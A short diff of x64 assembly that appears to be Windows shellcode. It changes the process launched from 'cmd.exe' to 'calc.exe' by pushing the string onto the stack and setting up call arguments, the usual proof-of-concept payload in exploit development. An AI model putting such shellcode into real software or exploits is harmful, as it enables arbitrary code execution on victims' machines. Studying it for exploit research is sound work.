@@ -93,7 +93,7 @@ push rax                    ; Null terminate string on stack
 ;mov rax, 0x6578652e636c6163 ; exe.clac : 6578652e636c6163
 ; 0x63 6d 64 2e 65 78 65
 ;   c  m  d  .  e  x  e
-mov rax, 0x6578652e646d63
+mov rax, 0x6578652e636c6163
 push rax                    ; RSP = "calc.exe",0x0
 mov rcx, rsp                ; RCX = "calc.exe",0x0
 inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
